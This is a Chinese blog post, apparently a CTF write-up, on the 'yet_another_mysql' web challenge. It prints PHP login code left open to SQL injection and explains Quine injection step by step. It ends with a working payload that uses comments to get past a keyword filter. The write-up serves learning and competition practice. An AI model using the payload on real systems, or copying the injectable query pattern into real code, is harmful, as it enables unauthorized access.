@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ctfHub|Recording | Dralin's SweetNest</title><meta name="author" content="DralinF"><meta name="copyright" content="DralinF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入发现漏洞|key花费50金币开启靶机,是一个login界面。我是先一顿乱登陆，发现只有admin可以进去。（其实人家标题已经写清楚了e）那就查看源码，发现&#x2F;?source，疑似验证源码，访问一下。那就开始代码审计 代码审计1234567891011121314151617181920212223242">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfHub|Recording">
+<meta property="og:url" content="http://fzsecurity-github.github.io/2023/11/15/ctfHub/index.html">
+<meta property="og:site_name" content="Dralin&#39;s SweetNest">
+<meta property="og:description" content="第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入发现漏洞|key花费50金币开启靶机,是一个login界面。我是先一顿乱登陆，发现只有admin可以进去。（其实人家标题已经写清楚了e）那就查看源码，发现&#x2F;?source，疑似验证源码，访问一下。那就开始代码审计 代码审计1234567891011121314151617181920212223242">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://fzsecurity-github.github.io/img/preview.jpg">
+<meta property="article:published_time" content="2023-11-15T02:44:22.000Z">
+<meta property="article:modified_time" content="2023-12-02T04:49:46.990Z">
+<meta property="article:author" content="DralinF">
+<meta property="article:tag" content="实战练习心得">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fzsecurity-github.github.io/img/preview.jpg"><link rel="shortcut icon" href="/img/sweetwo.png"><link rel="canonical" href="http://fzsecurity-github.github.io/2023/11/15/ctfHub/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: DralinF","link":"链接: ","source":"来源: Dralin's SweetNest","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ctfHub|Recording',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-02 12:49:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/myStyle.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/preview.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dralin's SweetNest"><span class="site-name">Dralin's SweetNest</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ctfHub|Recording</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-15T02:44:22.000Z" title="发表于 2023-11-15 10:44:22">2023-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-02T04:49:46.990Z" title="更新于 2023-12-02 12:49:46">2023-12-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Recorder/">Recorder</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ctfHub|Recording"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="第五空间智能安全大赛-Web-yet-another-mysql-SQL-Quine注入"><a href="#第五空间智能安全大赛-Web-yet-another-mysql-SQL-Quine注入" class="headerlink" title="第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入"></a>第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入</h2><h3 id="发现漏洞-key"><a href="#发现漏洞-key" class="headerlink" title="发现漏洞|key"></a>发现漏洞|key</h3><p>花费50金币开启靶机,是一个login界面。<br>我是先一顿乱登陆，发现只有admin可以进去。（其实人家标题已经写清楚了e）<br>那就查看源码，发现&#x2F;?source，疑似验证源码，访问一下。<br><img src="https://pic.imgdb.cn/item/65549f58c458853aef514b1d.jpg"><br>那就开始代码审计</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;<span class="comment">//对输入的password字段的正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;<span class="comment">//user不为admin不予通过，那就是user字段必须为admin</span></span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);<span class="comment">//对输入的password调用checksql进行校验</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;<span class="comment">//这是关键的sql查询语句</span></span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);<span class="comment">//将sql语句带入到数据库查询，查询成功返回true；否则返回false。</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);<span class="comment">//取出查询返回的对象</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;<span class="comment">//将查询出来的password与输入的匹配，如果类型以及数据一样那就可以显示flag。</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="审计后的思路"><a href="#审计后的思路" class="headerlink" title="审计后的思路"></a>审计后的思路</h3><p>1、首先校验存在一个正则表达式，这是不是可以通过&#x2F;**&#x2F;内联注释绕过，等下尝试以下。<br>2、</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;<span class="regexp">//</span>将查询出来的password与输入的匹配，如果类型以及数据一样那就可以显示flag。</span><br><span class="line">    die(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这段代码说明我们只可以在password字段进行操作，但是限制得比较苛刻，只有密码完全匹配上才显示flag。平时我们做的sql题目就靠爆字段就可以爆出flag，这里使用以前的思路明显不可行。<br>这里的思路是：<code>Quine注入</code>，即控制我们输入的语句以及后端数据库处理后输出的sql语句一致就可以绕过密码验证输出flag了。<br>那么我们该如何构造输入输出一致的payload呢，<code>接下来就是重点</code></p>
+<h3 id="Quine注入"><a href="#Quine注入" class="headerlink" title="Quine注入"></a>Quine注入</h3><p>1、首先得了解sql函数：<code>replace()</code><br>replace(object,search,replace)<br>把object对象中出现的的search全部替换成replace</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);# <span class="type">char</span>(<span class="number">46</span>)就是.</span><br></pre></td></tr></table></figure>
+<p>输出：一个.<br>2、输入输出如何大致可以一致</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace(&#x27;replace(<span class="string">&quot;.&quot;</span>,char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;,char(<span class="number">46</span>),&#x27;replace(<span class="string">&quot;.&quot;</span>,char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">replace</span><span class="params">(<span class="string">&quot;replace(&quot;</span>.<span class="string">&quot;,char(46),&quot;</span>.<span class="string">&quot;)&quot;</span>,char(<span class="number">46</span>)</span></span>,<span class="string">&quot;replace(&quot;</span>.<span class="string">&quot;,char(46),&quot;</span>.<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>但是还有单双引号不同。<br>3、解决单双引号不同的问题<br>有了上面的经验后，我们这样考虑，如果先将双引号替换成单引号是不是就可以解决引号不同的问题了。实现方法无非就是在套一层replace</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">replace</span>(<span class="built_in">replace</span>(&#x27;<span class="string">&quot;.&quot;</span>&#x27;,<span class="built_in">char</span>(<span class="number">34</span>),<span class="built_in">char</span>(<span class="number">39</span>)),<span class="built_in">char</span>(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>);# 先执行内层<span class="built_in">replace</span></span><br></pre></td></tr></table></figure>
+<p>输出：’.’</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace(<span class="name">replace</span>(&#x27;replace(<span class="name">replace</span>(<span class="string">&quot;.&quot;</span>,char(<span class="number">34</span>),char(<span class="number">39</span>)),char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;,char(<span class="number">34</span>),char(<span class="number">39</span>)),char(<span class="number">46</span>),&#x27;replace(<span class="name">replace</span>(<span class="string">&quot;.&quot;</span>,char(<span class="number">34</span>),char(<span class="number">39</span>)),char(<span class="number">46</span>),<span class="string">&quot;.&quot;</span>)&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),&#x27;<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)&#x27;)<span class="comment">//其实就是将2中的内容加上&#x27;&#x27;以及去掉原来的&#x27;&#x27;(因为是将这一整句话的&quot;&quot;换成&#x27;&#x27;)放入object以及replace中</span></span><br></pre></td></tr></table></figure>
+<p>此刻，输入输出完全一致。</p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>经过上面的分析，我们可以控制输入输出一致，但是还有一个问题，我们该如何绕过正则？<br><code>内联注释/**/</code><br>payload:</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;<span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="keyword">replace</span>(<span class="keyword">replace</span>(&#x27;1<span class="string">&quot;/**/union/**/select/**/replace(replace(&quot;</span>.<span class="string">&quot;,char(34),char(39)),char(46),&quot;</span>.<span class="string">&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="string">&quot;.&quot;</span>,<span class="built_in">char</span>(34),<span class="built_in">char</span>(39)),<span class="built_in">char</span>(46),<span class="string">&quot;.&quot;</span>)#&#x27;)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>Char(34)：&quot; ；Char(39)：&#39; ； char(46)：.</code><br>输入到password中。<br>这样即可获取flag。<br><img src="https://pic.imgdb.cn/item/65549f60c458853aef515b16.jpg"></p>
+<p><code>参考文献</code><br>SQL的replace()函数：<a target="_blank" rel="noopener" href="https://www.php.cn/faq/554187.html">https://www.php.cn/faq/554187.html</a><br>Quine注入：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53090346/article/details/125531088">https://blog.csdn.net/weixin_53090346/article/details/125531088</a><br>php函数 mysqli_query：<a target="_blank" rel="noopener" href="https://www.python100.com/html/55864.html">https://www.python100.com/html/55864.html</a><br>php函数 mysqli_fetch_array：<a target="_blank" rel="noopener" href="https://www.php.cn/faq/585787.html">https://www.php.cn/faq/585787.html</a><br>参考wp：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/15917521.html">https://www.cnblogs.com/zhengna/p/15917521.html</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%9E%E6%88%98%E7%BB%83%E4%B9%A0%E5%BF%83%E5%BE%97/">实战练习心得</a></div><div class="post_share"><div class="social-share" data-image="/img/preview.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/16/daimashenji/" title="php代码审计"><img class="cover" src="/img/reHe.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">php代码审计</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/11/phpMoreclass/" title="多类情况下的PHP反序列化"><img class="cover" src="/img/reHe.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">多类情况下的PHP反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/10/11/XssSelfPrac/" title="利用beef实现简单的XSS跨站攻击"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-11</div><div class="title">利用beef实现简单的XSS跨站攻击</div></div></a></div><div><a href="/2023/10/12/XssSelfPrac2/" title="XSS-labs通关little心得"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-12</div><div class="title">XSS-labs通关little心得</div></div></a></div><div><a href="/2023/12/01/billu/" title="billu"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-01</div><div class="title">billu</div></div></a></div><div><a href="/2023/10/27/buuojctf/" title="Buuctf Recording"><img class="cover" src="/img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-27</div><div class="title">Buuctf Recording</div></div></a></div><div><a href="/2023/10/21/cmslogicLoudong/" title="业务逻辑|白盒环境下某cms渗透测试"><img class="cover" src="/img/reHe.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-21</div><div class="title">业务逻辑|白盒环境下某cms渗透测试</div></div></a></div><div><a href="/2023/10/29/csoeDGUT/" title="200wCSOE|Recording"><img class="cover" src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-29</div><div class="title">200wCSOE|Recording</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">DralinF</div><div class="author-info__description">A Little Blog Of Dralin</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fzsecurity-github"><i class="fab fa-github"></i><span>Come with me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2786245981@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2786245981&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my little world</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-yet-another-mysql-SQL-Quine%E6%B3%A8%E5%85%A5"><span class="toc-text">第五空间智能安全大赛-Web-yet_another_mysql|SQL|Quine注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E-key"><span class="toc-text">发现漏洞|key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 